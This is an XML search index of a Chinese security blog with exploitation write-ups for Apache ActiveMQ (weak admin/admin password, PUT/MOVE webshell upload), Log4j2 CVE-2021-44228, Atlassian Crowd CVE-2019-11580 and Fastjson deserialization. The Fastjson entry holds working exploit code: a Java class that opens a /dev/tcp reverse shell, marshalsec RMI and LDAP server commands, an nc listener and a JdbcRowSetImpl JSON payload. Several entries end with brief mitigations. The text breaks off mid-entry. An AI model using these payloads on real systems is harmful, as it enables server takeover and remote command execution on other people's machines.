<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache ActiveMQ 未授权访问&amp;弱口令漏洞</title>
    <url>//209eabddaf61.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ActiveMQ 是 Apache 研发的开源消息服务器，它支持Java消息服务、集群、Spring Framework等。</p>
<p>ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现</p>
<p>随着中间件的启动，会打开两个端口，61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口</p>
<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver</p>
<p>其中admin是管理员页面，api是接口，fileserver是储存文件的接口。</p>
<p>admin和api都需要登录后才能访问，fileserver无需登录</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Apache ActiveMQ 全版本</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>下载地址：<a href="http://activemq.apache.org/components/classic/download/">http://activemq.apache.org/components/classic/download/</a></p>
<p>解压文件夹</p>
<p>启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ActiveMQ/bin/ActiveMQ.bat</span><br><span class="line"></span><br><span class="line">cd ActiveMQ/bin/</span><br><span class="line">./ActiveMQ start</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：61616（工作端口），8161（Web端口）</p>
<p>Apache ActiveMQ 在默认情况下，未做安全配置，没有登录验证，导致可以未授权访问</p>
<p>存在弱口令账号密码 admin/admin</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过未授权或者弱口令<code>admin/admin</code>登录Apache ActiveMQ</p>
<p>ActiveMQ默认开启PUT请求，当开启PUT时，访问不存在的目录，Response会返回相应的物理路径信息</p>
<p>如果存在未授权或默认口令，以下页面同样可以获取到物理路径</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure>

<p>在 ActiveMQ 5.12.x~5.13.x 版本中，默认关闭 fileserver 目录，可以在<code>conf/jetty.xml</code>中开启；</p>
<p>在5.14.0版本以后，彻底删除了fileserver应用</p>
<p>若服务器存在 fileserver 目录，则可以通过 PUT 请求写入文件</p>
<p>返回204说明上传成功，返回404或者500说明上传失败</p>
<p>但 fileserver 下的文件默认不解析，通过MOVE方法请求移动文件</p>
<p>把文件移动到可以被解析的<code>admin/</code>下或者<code>api/</code>下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/shell.jsp</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code>为<code>securityConstraint</code>下的<code>authenticate</code>修改值为<code>true</code>，重启服务即可</li>
<li>修改<code>conf/jetty.xml</code>文件，<code>bean id</code> 为<code>securityLoginService</code>下的<code>conf</code>值获取用户properties，修改用户名密码，重启服务即可</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>Apache</category>
        <category>常规漏洞</category>
        <category>ActiveMQ</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache ActiveMQ 未授权访问漏洞 - CVE-2021-26117</title>
    <url>//8ead4fcca5cb.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ActiveMQ 是 Apache 研发的开源消息服务器，它支持Java消息服务、集群、Spring Framework等。</p>
<p>ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现</p>
<p>随着中间件的启动，会打开两个端口，61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口</p>
<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver</p>
<p>其中admin是管理员页面，api是接口，fileserver是储存文件的接口。</p>
<p>admin和api都需要登录后才能访问，fileserver无需登录</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Apache ActiveMQ Artemis &lt; 2.16.0</li>
<li>Apache ActiveMQ &lt; 5.16.1</li>
<li>Apache ActiveMQ &lt; 5.15.14</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>下载地址：<a href="http://activemq.apache.org/components/classic/download/">http://activemq.apache.org/components/classic/download/</a></p>
<p>解压文件夹</p>
<p>启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ActiveMQ/bin/ActiveMQ.bat</span><br><span class="line"></span><br><span class="line">cd ActiveMQ/bin/</span><br><span class="line">./ActiveMQ start</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：61616（工作端口），8161（Web端口）</p>
<p>ActiveMQ LDAP登录模块可被配置为使用匿名访问。在这种情况下，远程攻击者在只提供有效的用户名时，无需提供密码，可造成LDAP未授权访问</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>遍历用户名，通过匿名访问的方式登录</p>
<p>ActiveMQ默认开启PUT请求，当开启PUT时，访问不存在的目录，Response会返回相应的物理路径信息</p>
<p>如果存在未授权或默认口令，以下页面同样可以获取到物理路径</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure>

<p>在 ActiveMQ 5.12.x~5.13.x 版本中，默认关闭 fileserver 目录，可以在<code>conf/jetty.xml</code>中开启；</p>
<p>在5.14.0版本以后，彻底删除了fileserver应用</p>
<p>若服务器存在 fileserver 目录，则可以通过 PUT 请求写入文件</p>
<p>返回204说明上传成功，返回404或者500说明上传失败</p>
<p>但 fileserver 下的文件默认不解析，通过MOVE方法请求移动文件</p>
<p>把文件移动到可以被解析的<code>admin/</code>下或者<code>api/</code>下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/shell.jsp</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将 Apache ActiveMQ 升级为最新版本</li>
<li>禁止在 LDAP 配置中使用匿名绑定</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>Apache</category>
        <category>常规漏洞</category>
        <category>ActiveMQ</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Log4j2 远程代码执行漏洞 - CVE-2021-44228</title>
    <url>//5dc390d54be4.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。</p>
<h2 id="Java-日志体系"><a href="#Java-日志体系" class="headerlink" title="Java 日志体系"></a>Java 日志体系</h2><p>在 2001 年之前，Java不存在日志库，打印日志均通过 <code>system.out</code> 和 <code>system.err</code></p>
<p>该方式有以下缺点：</p>
<ul>
<li>  大量 IO 操作</li>
<li>  无法合理控制输出，并且输出内容不能保存</li>
<li>  无法定制日志格式</li>
</ul>
<p>在 2001 年，软件开发者 Ceki Gulcu 设计出了一套日志库为<code>Log4j</code>，并且该项目加入Apache</p>
<p>为了方便开发者选择使用，Apache 推出了日志门面 JCL （Jakarta Commons Logging），它提供了一个日志抽象层，在运行时动态的绑定日志来实现组件来工作（如Log4j，java.util.logging）。导入哪个就绑定哪个，不需要再修改配置。如果没有导入的话内部有一个Simple logger的简单实现，但是功能很弱，直接忽略。</p>
<p>在 2006 年，Log4j 的作者 Ceki Gulcu 离开了 Apache 后，开发了另一套日志库 Slf4j（Simple Logging Facade for Java）。Slf4j 需要桥接包来和日志实现组件建立关系，由于每次使用都需要配合桥接包。作者又开发出了 Logback 日志标准库作为 Slf4j 接口的默认实现。</p>
<p>在 2012 年，Apache 推出了新的日志库 <code>Log4j2</code>，并且不兼容 Log4j</p>
<p>Log4j2 具有 Logback 的所有特性，并且做了分离设计，分为 <code>log4j-api</code> 和 <code>log4j-core</code></p>
<p>log4j-api 是日志接口</p>
<p>log4j-core 是日志标准库</p>
<p>除此之外 Apache 还为 Log4j2 提供了各种桥接包</p>
<p>从此 Log4j2 便成为各种 JAVA 程序的默认日志实现</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为</p>
<p>攻击者使用 <code>$&#123;&#125;</code> 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
<p>由于其触发方式简单、使用范围广泛，因此漏洞危害极大。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Log4j2  &gt; 2.0</p>
<p>Apache Log4j2 &lt; 2.14.1</p>
<p>在 Java 相关应用中有数万个开源软件使用 Apache Log4j2，影响范围极大，几乎涉及到所有的Java应用</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>Log4j2 下载地址：<a href="https://logging.apache.org/log4j/2.x/download.html">https://logging.apache.org/log4j/2.x/download.html</a></p>
<p>然后在项目中添加依赖</p>
<p>使用 maven 来引入 Log4j2 组件的 2.14.0 版本，在工程目录的 pom.xml 下添加如下配置，会导入两个jar包</p>
<blockquote>
<p>  org.apache.logging.log4j:log4j-api:2.14.0</p>
<p>  org.apache.logging.log4j:log4j-core:2.14.0</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在工程目录 resources 下创建 log4j2.xml 配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appenders</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> &gt;</span></span><br><span class="line"><span class="comment">&lt;!--            配置Console的模式布局--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置日志级别--&gt;</span>     </span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>log4j2 支持多种日志级别，通过日志级别可以对日志信息分类，在合适的地方输出日志，日志级别分为六个级别，还定义了内置的标准级别 intLevel，由数值表示，级别越高数值越小</p>
<table>
<thead>
<tr>
<th align="center">日志级别</th>
<th align="center">intLevel</th>
</tr>
</thead>
<tbody><tr>
<td align="center">OFF</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">FATAL（致命的）</td>
<td align="center">100</td>
</tr>
<tr>
<td align="center">ERROR</td>
<td align="center">200</td>
</tr>
<tr>
<td align="center">WARN</td>
<td align="center">300</td>
</tr>
<tr>
<td align="center">INFO</td>
<td align="center">400</td>
</tr>
<tr>
<td align="center">DEBUG</td>
<td align="center">500</td>
</tr>
<tr>
<td align="center">TRACE（堆栈）</td>
<td align="center">600</td>
</tr>
<tr>
<td align="center">ALL</td>
<td align="center">integer.MAX_VALUE</td>
</tr>
</tbody></table>
<p>搭建代码环境</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j2Rce2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j2Rce2.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;java:os&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>触发漏洞语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://58bafab2.check.dns1.top&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>java 应用存在如下组件</p>
<ul>
<li>  log4j-api</li>
<li>  log4j-core</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2>]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>Apache</category>
        <category>常规漏洞</category>
        <category>Log4j2</category>
        <category>远程代码执行漏洞</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Atlassian Crowd 未授权访问漏洞 - CVE-2019-11580</title>
    <url>//a5e49e0e2f90.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​        Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为用用户、网络应用程序和目录服务器提供验证、授权等功能</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​        Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了了pdkinstall开发插件,使其存在安全漏漏洞洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件,执行任意代码/命令,从而获得服务器权限</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Atlassian Crowd = 2.1.x </p>
<p>Atlassian Crowd = 3.0.x ~3.0.4</p>
<p>Atlassian Crowd = 3.1.x ~ 3.1.5</p>
<p>Atlassian Crowd = 3.2.x ~ 3.2.7</p>
<p>Atlassian Crowd = 3.3.x ~ 3.3.4</p>
<p>Atlassian Crowd = 3.4.x ~ 3.4.3</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>需要Java环境</p>
<p>下载地址：<a href="https://www.atlassian.com/zh/software/crowd/download-archive">https://www.atlassian.com/zh/software/crowd/download-archive</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建账号</span></span><br><span class="line">useradd crowd</span><br><span class="line">passwd crowd</span><br><span class="line">su - crowd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载</span></span><br><span class="line">wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-4.4.0.zip</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar -zxvf atlassian-crowd-4.4.0.zip</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置 crowd.home</span></span><br><span class="line">vim atlassian-crowd-4.4.0/crowd-webapp/WEB-INF/classes/crowd-init.properties</span><br><span class="line">crowd.home=/home/crowd/atlassian-crowd-4.4.0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加载 Mysql jdbc 驱动</span></span><br><span class="line">cp mysql-connector-java-5.1.46.jar /home/crowd/atlassian-crowd-4.4.0/apache-tomcat/lib</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 crowd</span></span><br><span class="line">sh /home/crowd/atlassian-crowd-4.4.0/start_crowd.sh</span><br></pre></td></tr></table></figure>

<p>访问页面，输入License</p>
<p><a href="http://127.0.0.1:8095/">http://127.0.0.1:8095</a></p>
<p>选择导入备份，设置数据库信息，设置参数，设置管理员账号等</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>端口：8095</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载POC：<a href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-11580.py http://127.0.0.1:8095</span><br></pre></td></tr></table></figure>
<p>通过修改cmd后面参数，可以任意执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8095/crowd/plugins/servlet/exp?cmd=ifconfig</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>设置访问<code>/crowd/admin/uploadplugin.action</code>的源ip</li>
<li>升级 Atlassian Crowd 为最新版本</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>Atlassian Crowd</category>
        <category>常规漏洞</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化</title>
    <url>//6d3d85286059.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Fastjson是阿里巴巴的开源的 <code>Java JSON</code> 解析库，它可以解析<code>JSON</code>格式的字符串，支持将<code>Java Bean</code> 序列化为 <code>JSON</code> 字符串，也可以从 <code>JSON</code> 字符串反序列化到 <code>JavaBean</code></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><code>Fastjson</code>提供了反序列化功能，允许用户在输入<code>JSON</code>串时通过<code>@type</code>键对应的value指定任意反序列化类名</p>
<p><code>Fastjson</code>自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的<code>setter</code>方法及部分<code>getter</code>方法</p>
<p>那么当组件开启了<code>aototype</code>功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定<code>setter</code>或者<code>getter</code>方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的<code>Gadget</code>），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启<code>autotype</code>功能的绕过。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>&lt;=FastJson 1.2.47</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="RMI模式getshell"><a href="#RMI模式getshell" class="headerlink" title="RMI模式getshell"></a>RMI模式getshell</h3><p>编写代码EXPloit.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成class文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac EXPloit.java</span><br></pre></td></tr></table></figure>

<p>将生成的文件放到web下面</p>
<p>启动一个WEB服务，用于访问EXPloit.class</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>开启一个RMI监听端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://ip:8080/#Exploit&quot; 9999</span><br></pre></td></tr></table></figure>

<p>NC监听8888端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>burp抓包，通过post请求，发送payload</p>
<p>添加请求头</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">COntent-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>

<p>添加payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://ip:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="LDAP模式getshell"><a href="#LDAP模式getshell" class="headerlink" title="LDAP模式getshell"></a>LDAP模式getshell</h3><p>编写代码EXPloit.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成class文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac EXPloit.java</span><br></pre></td></tr></table></figure>

<p>将生成的文件放到web下面</p>
<p>启动一个WEB服务，用于访问EXPloit.class</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>开启一个RMI监听端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://ip:8080/#Exploit&quot; 9999</span><br></pre></td></tr></table></figure>

<p>NC监听8888端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>burp抓包，通过post请求，发送payload</p>
<p>添加请求头</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">COntent-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>

<p>添加payload</p>
